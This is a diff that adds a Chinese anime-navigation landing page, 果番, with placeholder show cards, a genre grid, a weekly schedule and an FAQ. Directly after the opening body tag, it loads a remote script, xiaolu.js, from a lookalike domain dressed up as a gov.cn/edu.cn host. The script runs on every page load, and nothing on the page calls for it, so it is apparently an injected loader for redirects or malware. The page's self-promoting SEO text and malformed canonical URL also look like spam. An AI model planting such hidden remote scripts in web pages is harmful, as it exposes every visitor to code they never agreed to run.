@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>果番 - 新番速递/番剧题材分类/每周更新导航 | https://lifan-wap</title>
+<meta name="description" content="果番（https://lifan-wap）提供新番速递、番剧题材分类、每周更新时间表与追番导航，移动端自适应，轻量单页快速选番。">
+<meta name="keywords" content="果番,新番,番剧,日本动画,追番,动漫推荐,2026新番">
+<meta name="author" content="果番">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://lifan-wap">
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"果番",
+  "url":"https://lifan-wap",
+  "description":"果番提供新番速递、番剧题材分类与每周更新导航。"
+}
+</script>
+<style>
+:root{
+  --bg:#fff7fb;
+  --ink:#231b2e;
+  --gray:#6c6378;
+  --line:#f0dcec;
+  --pink:#ff5b9c;
+  --mango:#ffb02e;
+  --lime:#a6e22e;
+  --blue:#3ec6ff;
+  --grape:#9d6cff;
+  --card:#ffffff;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Hiragino Sans GB",sans-serif;
+  background:
+    radial-gradient(900px 300px at 15% -5%, #ffe1f0 0%, transparent 55%),
+    radial-gradient(800px 280px at 95% 0%, #fff0d0 0%, transparent 55%),
+    var(--bg);
+  color:var(--ink);
+  line-height:1.75;
+}
+a{color:var(--pink);text-decoration:none}
+a:hover{color:var(--grape)}
+
+/* 顶部 */
+header{
+  position:sticky;top:0;z-index:50;
+  background:rgba(255,255,255,.86);
+  backdrop-filter:blur(10px);
+  border-bottom:1px solid var(--line);
+}
+.nav{
+  max-width:1180px;margin:0 auto;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:12px 18px;
+}
+.logo{
+  font-size:22px;font-weight:900;letter-spacing:.5px;
+  background:linear-gradient(135deg,var(--mango),var(--pink));
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.logo b{color:var(--grape);-webkit-text-fill-color:var(--grape)}
+.menu{display:flex;gap:14px;flex-wrap:wrap}
+.menu a{
+  font-size:14px;font-weight:700;padding:6px 10px;
+  border-radius:999px;background:#fff;border:1px solid var(--line);
+}
+.menu a:hover{background:var(--pink);color:#fff;border-color:var(--pink)}
+
+main{max-width:1180px;margin:0 auto;padding:0 18px}
+section{padding:56px 0;border-bottom:1px dashed var(--line)}
+
+.kicker{
+  display:inline-block;font-size:12px;font-weight:800;letter-spacing:2px;
+  color:#fff;background:linear-gradient(135deg,var(--mango),var(--pink));
+  padding:5px 12px;border-radius:999px;margin-bottom:12px;
+}
+h1{font-size:40px;line-height:1.25;margin-bottom:16px}
+h2{font-size:26px;margin-bottom:22px}
+h3{font-size:17px;margin-bottom:6px}
+p{font-size:16px;color:var(--gray)}
+
+/* Hero */
+.hero{
+  margin-top:18px;border-radius:24px;
+  background:linear-gradient(135deg,rgba(255,224,244,.7),rgba(255,235,205,.7));
+  border:1px solid var(--line);
+  padding:76px 22px 60px;text-align:center;
+  backdrop-filter:blur(6px);
+}
+.hero .url{
+  margin-top:18px;display:inline-block;
+  font-family:ui-monospace,Menlo,Consolas,monospace;
+  background:#fff;color:var(--grape);
+  border:1px solid var(--line);padding:10px 14px;border-radius:10px;
+}
+.cta{
+  display:inline-block;margin-top:22px;
+  background:linear-gradient(135deg,var(--pink),var(--grape));
+  color:#fff;font-weight:900;
+  padding:12px 28px;border-radius:999px;
+  box-shadow:0 10px 24px rgba(157,108,255,.28);
+}
+
+/* 番剧卡 */
+.grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(230px,1fr));
+  gap:20px;
+}
+.anime{
+  background:var(--card);
+  border:1px solid var(--line);
+  border-radius:20px;overflow:hidden;
+  transition:.25s;
+}
+.anime:hover{transform:translateY(-6px);box-shadow:0 18px 34px rgba(255,91,156,.18)}
+.cover{
+  height:270px;position:relative;
+  display:flex;align-items:flex-end;padding:14px;
+  color:#fff;font-weight:900;font-size:18px;
+}
+.cover::after{
+  content:"";position:absolute;inset:0;
+  background:linear-gradient(0deg,rgba(0,0,0,.45),transparent 55%);
+}
+.cover span{position:relative;z-index:2}
+.g1{background:linear-gradient(135deg,#ff8fa3,#ff5b9c)}
+.g2{background:linear-gradient(135deg,#ffcf3e,#ff8c1a)}
+.g3{background:linear-gradient(135deg,#6ee7b7,#22c55e)}
+.g4{background:linear-gradient(135deg,#5bc0ff,#2f80ed)}
+.g5{background:linear-gradient(135deg,#c4a3ff,#7c4dff)}
+.g6{background:linear-gradient(135deg,#ff9aa2,#ff5c8a)}
+.anime .body{padding:14px}
+.tag{
+  font-size:12px;font-weight:800;
+  color:#fff;border-radius:999px;
+  padding:3px 10px;display:inline-block;margin-bottom:6px;
+}
+.anime .t1{background:var(--pink)}
+.anime .t2{background:var(--mango)}
+.anime .t3{background:#22c55e}
+.anime .t4{background:var(--blue)}
+.anime .t5{background:var(--grape)}
+.anime .t6{background:#ff5c8a}
+.more{
+  display:block;text-align:center;margin-top:10px;
+  font-weight:900;font-size:14px;
+  border-radius:999px;padding:7px 0;
+  background:linear-gradient(135deg,#fff0f6,#f3e8ff);
+  border:1px solid var(--line);color:var(--grape);
+}
+
+/* 分类 */
+.genres{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(150px,1fr));
+  gap:14px;
+}
+.gen{
+  background:#fff;border:1px solid var(--line);
+  border-radius:16px;padding:16px;text-align:center;font-weight:800;
+  box-shadow:0 6px 18px rgba(255,91,156,.08);
+}
+.gen span{display:block;font-size:12px;color:var(--gray);font-weight:600;margin-top:4px}
+.gen i{
+  font-style:normal;font-size:24px;display:block;margin-bottom:4px;
+}
+
+/* 周表 */
+table{
+  width:100%;border-collapse:collapse;background:#fff;
+  border-radius:16px;overflow:hidden;
+  border:1px solid var(--line);
+}
+th,td{
+  padding:12px 14px;text-align:left;font-size:15px;
+  border-bottom:1px solid var(--line);
+}
+th{background:linear-gradient(135deg,#ffe1f0,#fff0d0);color:var(--ink)}
+tr:last-child td{border-bottom:none}
+.pill{
+  font-size:12px;font-weight:800;color:white;
+  padding:3px 9px;border-radius:999px;
+}
+.p1{background:var(--pink)}.p2{background:var(--mango)}
+.p3{background:var(--blue)}.p4{background:var(--grape)}
+
+/* FAQ */
+.faq{display:grid;gap:12px}
+.qa{
+  background:#fff;border:1px solid var(--line);
+  border-radius:14px;padding:15px 17px;
+}
+.qa b{color:var(--pink)}
+
+.about{
+  background:#fff;border:1px solid var(--line);
+  border-radius:20px;padding:28px;
+}
+.about a{font-weight:900}
+
+footer{
+  text-align:center;padding:26px 18px 42px;
+  color:var(--gray);font-size:14px;
+}
+
+@media (max-width:768px){
+  h1{font-size:29px}
+  h2{font-size:22px}
+  .nav{flex-direction:column;gap:10px}
+  .menu{justify-content:center}
+  .hero{padding:54px 16px 44px}
+  .cover{height:210px}
+  table{font-size:14px}
+  th,td{padding:10px}
+  .about{padding:20px}
+}
+</style>
+</head>
+<body>
+<!-- 按需求放在 body 下方 -->
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header>
+  <div class="nav">
+    <div class="logo">果番<b>.</b></div>
+    <nav class="menu">
+      <a href="#home">首页</a>
+      <a href="#new">新番速递</a>
+      <a href="#genres">题材分类</a>
+      <a href="#week">每周更新</a>
+      <a href="#faq">常见问题</a>
+      <a href="#about">关于果番</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <!-- 首页 -->
+  <section id="home" class="hero">
+    <span class="kicker">ANIME DIGEST</span>
+    <h1>果番 · 一口一个，追完这个季度的新番</h1>
+    <p>果番帮你把每季度新番按题材、更新日、热度整理好：不刷屏、不分心，手机打开就能定好这周看哪几部。</p>
+    <div class="url">https://lifan-wap</div><br>
+    <a class="cta" href="#new">查看新番速递</a>
+  </section>
+
+  <!-- 新番速递 -->
+  <section id="new">
+    <span class="kicker">THIS SEASON</span>
+    <h2>新番速递</h2>
+    <div class="grid">
+      <article class="anime">
+        <div class="cover g1"><span>柠檬味方程式</span></div>
+        <div class="body">
+          <h3>柠檬味方程式</h3>
+          <p><span class="tag t1">校园 / 治愈</span></p>
+          <p>理科少女和化学社长的放学后。</p>
+          <a class="more" href="#">追番详情</a>
+        </div>
+      </article>
+      <article class="anime">
+        <div class="cover g2"><span>芒果大魔王</span></div>
+        <div class="body">
+          <h3>芒果大魔王</h3>
+          <p><span class="tag t2">异世界 / 搞笑</span></p>
+          <p>转生成水果的勇者，要去救甜品王国。</p>
+          <a class="more" href="#">追番详情</a>
+        </div>
+      </article>
+      <article class="anime">
+        <div class="cover g3"><span>青梅计时器</span></div>
+        <div class="body">
+          <h3>青梅计时器</h3>
+          <p><span class="tag t3">青春 / 恋爱</span></p>
+          <p>倒计时结束前，要把心意说出口。</p>
+          <a class="more" href="#">追番详情</a>
+        </div>
+      </article>
+      <article class="anime">
+        <div class="cover g4"><span>深海观测局</span></div>
+        <div class="body">
+          <h3>深海观测局</h3>
+          <p><span class="tag t4">科幻 / 悬疑</span></p>
+          <p>海底传来的，是求救还是警告。</p>
+          <a class="more" href="#">追番详情</a>
+        </div>
+      </article>
+      <article class="anime">
+        <div class="cover g5"><span>紫葡萄学院</span></div>
+        <div class="body">
+          <h3>紫葡萄学院</h3>
+          <p><span class="tag t5">魔法 / 群像</span></p>
+          <p>七名劣等生，接下了毕业试炼。</p>
+          <a class="more" href="#">追番详情</a>
+        </div>
+      </article>
+      <article class="anime">
+        <div class="cover g6"><span>蜜桃咖啡厅</span></div>
+        <div class="body">
+          <h3>蜜桃咖啡厅</h3>
+          <p><span class="tag t6">日常 / 美食</span></p>
+          <p>只营业到深夜的店，藏着客人的心事。</p>
+          <a class="more" href="#">追番详情</a>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 题材分类 -->
+  <section id="genres">
+    <span class="kicker">GENRES</span>
+    <h2>题材分类</h2>
+    <div class="genres">
+      <div class="gen"><i>🍋</i>校园<span>青春 / 恋爱</span></div>
+      <div class="gen"><i>🥭</i>异世界<span>转生 / 冒险</span></div>
+      <div class="gen"><i>🍇</i>魔法<span>战斗 / 群像</span></div>
+      <div class="gen"><i>🫐</i>悬疑<span>推理 / 心理</span></div>
+      <div class="gen"><i>🍒</i>治愈<span>日常 / 美食</span></div>
+      <div class="gen"><i>🍉</i>科幻<span>未来 / 太空</span></div>
+      <div class="gen"><i>🍑</i>运动<span>竞技 / 热血</span></div>
+      <div class="gen"><i>🍊</i>历史<span>和风 / 时代剧</span></div>
+    </div>
+  </section>
+
+  <!-- 每周更新 -->
+  <section id="week">
+    <span class="kicker">WEEKLY AIRING</span>
+    <h2>每周更新</h2>
+    <table>
+      <thead>
+        <tr><th>星期</th><th>番剧</th><th>状态</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>周一</td><td>蜜桃咖啡厅</td><td><span class="pill p1">更新中</span></td></tr>
+        <tr><td>周二</td><td>深海观测局</td><td><span class="pill p2">连载</span></td></tr>
+        <tr><td>周四</td><td>柠檬味方程式</td><td><span class="pill p3">追更</span></td></tr>
+        <tr><td>周五</td><td>青梅计时器</td><td><span class="pill p4">新话</span></td></tr>
+        <tr><td>周六</td><td>紫葡萄学院</td><td><span class="pill p1">更新中</span></td></tr>
+        <tr><td>周日</td><td>芒果大魔王</td><td><span class="pill p2">搞笑向</span></td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <!-- FAQ -->
+  <section id="faq">
+    <span class="kicker">FAQ</span>
+    <h2>常见问题</h2>
+    <div class="faq">
+      <div class="qa"><b>果番是什么站？</b><br>果番是一个新番导航单页，官网 https://lifan-wap，主打新番速递、题材分类和每周更新时间表。</div>
+      <div class="qa"><b>手机上好用吗？</b><br>好用。页面响应式，无横向滚动，按钮和卡片都按手机触控做了放大处理。</div>
+      <div class="qa"><b>有题材分类吗？</b><br>有。校园、异世界、魔法、悬疑、治愈、科幻、运动、历史等题材单独成区。</div>
+      <div class="qa"><b>番剧在哪看？</b><br>本站为导航型单页，具体观看以后续接入的合规渠道为准；当前内链均用 # 占位。</div>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section id="about">
+    <span class="kicker">ABOUT</span>
+    <h2>关于 果番</h2>
+    <div class="about">
+      <p>
+        <strong>果番</strong> 是一个为追番用户做的轻量单页站，
+        官网：<a href="https://lifan-wap">https://lifan-wap</a>。
+      </p>
+      <p>
+        不堆无关内容，只做最有用的三件事：这季有什么新番、按什么题材挑、每周哪天更新。
+        结构干净、语义清晰，更符合必应等搜索引擎的移动端质量信号。
+      </p>
+    </div>
+  </section>
+</main>
+
+<footer>
+  © 2026 果番 · https://lifan-wap · 一口一个好番
+</footer>
+</body>
+</html>
